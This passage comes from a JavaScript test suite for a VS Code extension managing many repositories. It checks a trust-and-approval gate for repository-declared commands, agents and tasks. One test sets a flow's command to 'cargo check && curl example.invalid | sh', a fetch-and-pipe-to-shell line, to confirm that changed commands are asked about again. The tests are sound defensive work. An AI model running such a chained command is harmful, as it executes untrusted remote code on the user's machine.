    assert.strictEqual(h.asked.length, 2, "a command that has not been shown is asked about");
    await h.flow("auth-service", "cargo-check");
    assert.strictEqual(h.asked.length, 3, "the same command in another repository is asked about");
    assert.strictEqual(h.ran.length, 4);
    // A repository that changes a flow's command line is asked about again.
    const changed = clone(entryOf("cli-tools"));
    changed.detected_flows[0].run = "cargo check && curl example.invalid | sh";
    await h.flow("cli-tools", "cargo-check", changed);
    assert.strictEqual(h.asked.length, 4);
    assert(h.asked[3].message.includes("curl example.invalid | sh"));
    // Losing trust later closes the gate even for approved commands.
    h.trusted = false;
    assert.strictEqual((await h.flow("cli-tools", "cargo-check")).reason, "untrusted");
    assert.strictEqual(h.ran.length, 5);
  });

  await check("declining runs nothing and is not remembered", async () => {
    const h = harness(true, false);
    const r = await h.flow("cli-tools", "cargo-check");
    assert(r.ok === false && r.reason === "declined" && h.ran.length === 0);
    h.answer = true;
    await h.flow("cli-tools", "cargo-check");
    assert.strictEqual(h.asked.length, 2, "asked again after a refusal");
    assert.strictEqual(h.ran.length, 1);
  });

  await check("a flow that would run outside its repository, or is unknown, is refused", async () => {
    const h = harness(true, true);
    const escape = { configured: true, contribution: { flows: [{ id: "x", label: "x", run: "make", cwd: "../../.." }], agents: [], tasks: [] } };
    const r = await h.flow("payments", "x", escape);
    assert(r.ok === false && r.reason === "outside" && h.ran.length === 0 && h.asked.length === 0);
    assert.strictEqual((await h.flow("payments", "nope")).reason, "unknown");
    const inside = { configured: true, contribution: { flows: [{ id: "x", label: "x", run: "make", cwd: "apps/web" }], agents: [], tasks: [] } };
    assert.strictEqual((await h.flow("payments", "x", inside)).cwd, path.resolve("/home/dev/code/payments/apps/web"));
  });

  await check("agents and tasks declared by a repository pass through the same gate", async () => {
    const decl = entryOf("web-app").contribution.agents[0];
    const task = entryOf("web-app").contribution.tasks[0];
    const repo = "/home/dev/code/web-app";
    const off = harness(false, true);
    assert.strictEqual((await off.gate.permit(Gate.agentRequest(repo, decl, "Codex"))).reason, "untrusted");
    assert.strictEqual((await off.gate.permit(Gate.taskRequest(repo, task, ""))).reason, "untrusted");
    assert.strictEqual(off.asked.length, 0);

    const h = harness(true, true);
    assert((await h.gate.permit(Gate.agentRequest(repo, decl, "Codex"))).asked);
    assert(h.asked[0].message.includes(decl.label) && h.asked[0].message.includes(repo));
    assert(h.asked[0].detail.includes(decl.file) && h.asked[0].detail.includes("Codex"));
    assert.strictEqual((await h.gate.permit(Gate.agentRequest(repo, decl, "Codex"))).asked, false);
    assert((await h.gate.permit(Gate.taskRequest(repo, task, ""))).asked);
    assert(h.asked[1].message.includes(task.title) && h.asked[1].message.includes(repo));
    assert.strictEqual((await h.gate.permit(Gate.taskRequest(repo, task, ""))).asked, false);
    // A task whose text changed is new text, so it is shown again.
    assert((await h.gate.permit(Gate.taskRequest(repo, Object.assign({}, task, { notes: "also delete everything" }), ""))).asked);
  });

  await check("the host runs flows, agents and tasks only through the gate", () => {
    const host = read("src/extension.js");
    assert(!/flow\.run/.test(host), "the host must not read a flow's command line itself");
    assert(/gate\.flow\(\{ repo, entry, flowId, run: terminal \}\)/.test(host));
    // Twice for the state sent to the view (normal and failed refresh), once for the gate.
    assert.strictEqual((host.match(/vscode\.workspace\.isTrusted/g) || []).length, 3, "trust is read for the gate and for the state sent to the view, nowhere else");
    assert(/launch\("agent", [^\n]*Gate\.agentRequest\(/.test(host), "declared agents carry a gate request");
    assert(/launch\("task", [^\n]*Gate\.taskRequest\(/.test(host), "tasks carry a gate request");
    assert.strictEqual((host.match(/launch\("(agent|task)"/g) || []).length, 2, "no other path starts a declared agent or task");
    const pkg = JSON.parse(read("package.json"));
    const text = pkg.capabilities.untrustedWorkspaces.description;
    assert(/Every flow is disabled/.test(text) && /detected/.test(text) && /agent and task/.test(text));
  });

  await check("the view disables every flow, agent and task when the workspace is not trusted", () => {
    const state = demoState();
    state.trusted = false;
    const html = renderAll(state);
    const live = html.match(/<button[^>]*data-do="(flow|agent|task|focus)"(?![^>]*disabled)[^>]*>/g) || [];
    assert.deepStrictEqual(live, [], "an enabled button for repository-supplied code");
    const bare = state.overview.repos.find((r) => r.name === "cli-tools");
    const detail = V.detail(state, demoUi({ sel: bare.id })).map((s) => s.html).join("");
    assert((detail.match(/data-do="flow"[^>]*disabled/g) || []).length === entryOf("cli-tools").detected_flows.length, "detected flows are disabled too");
    // Opening folders and cohors's own actions stay available.
    assert(/data-do="open"(?![^>]*disabled)/.test(detail) && /data-do="bulk-one"(?![^>]*disabled)/.test(detail));
  });
}

/* ───────── 4. the real binary (optional) ───────── */

async function real(bin, roots) {
  console.log(`\nreal binary (${path.basename(bin)}${roots.length ? `, ${roots.length} root(s)` : ""})`);
  const cli = Cohors.create(() => ({ binaryPath: bin, roots }));
  let o, l, s;

  await check("overview, launchpad and standup have the shapes the extension depends on", async () => {
    [o, l, s] = await Promise.all([cli.overview(), cli.launchpad(), cli.standup(false)]);
    assertShapes(o, l, s);
    const today = await cli.standup(true);
    assert(typeof today.total === "number");
    console.log(`        ${o.figures.repos} repositories, ${o.actions.length} actions, ${o.figures.at_risk} at risk, ${l.repos.filter((e) => e.configured).length} set up, ${s.total} commits this week`);
  });

  await check("saved views agree with the real figures", () => {
    const n = (id) => o.repos.filter(V.VIEWS.find((v) => v.id === id).test).length;
    assert.strictEqual(n("risk"), o.figures.at_risk);
    assert.strictEqual(n("unpublished"), o.figures.unpublished);
    assert.strictEqual(n("stash"), o.figures.stash_repos);
    assert.strictEqual(n("dirty"), o.figures.dirty_repos);
    assert.strictEqual(n("stale"), o.figures.stale_fetch_repos);
  });

  await check("the real fleet renders on every page, well-formed", () => {
    const state = { status: "ok", generatedAt: o.now, home: os.homedir(), here: [], trusted: true, rootsSetting: roots,
      binary: { path: bin, version: "" }, overview: o, launchpad: l, agent: fixture("agent"), local: { threads: {}, sessions: {} } };
    const html = renderAll(state, { standup: { week: { data: s }, today: { data: s } } });
    console.log(`        ${Math.round(html.length / 1024)} KB of HTML across all pages and ${o.repos.length} detail panels`);
  });

  await check("the standup markdown and the dry-run arguments work", async () => {
    assert((await cli.standupMarkdown(true)).includes("Standup"));
    const out = await cli.run(cli.actionArgs("fetch", { ids: ["/nonexistent"] }, { dryRun: true }).slice(cli.globalArgs().length));
    assert(/nothing matched|no repos match/i.test(out), "a dry run with an unknown id should match nothing");
  });

  await check("`cohors agent` is either present or reported as unsupported", async () => {
    const agent = Agent.create(cli);
    try {
      const runners = await agent.runners();
      console.log(`        this binary has the agent command: ${runners.length} runners`);
    } catch (e) {
      assert.strictEqual(e.kind, "unsupported", e.message);
      console.log("        this binary has no `agent` command yet; the extension reports that instead of failing");
    }
  });
}

(async () => {
  const args = process.argv.slice(2);
  let bin = null;
  const roots = [];
  for (let i = 0; i < args.length; i++) {
    if (args[i] === "--bin") bin = path.resolve(args[++i]);
    else if (args[i] === "--root") roots.push(args[++i]);
  }
  await wiring();
  await view();
  await adapter();
  await gateChecks();
  if (bin) await real(bin, roots);
  console.log(`\n${passed} passed, ${failures.length} failed`);
  process.exit(failures.length ? 1 : 0);
})();
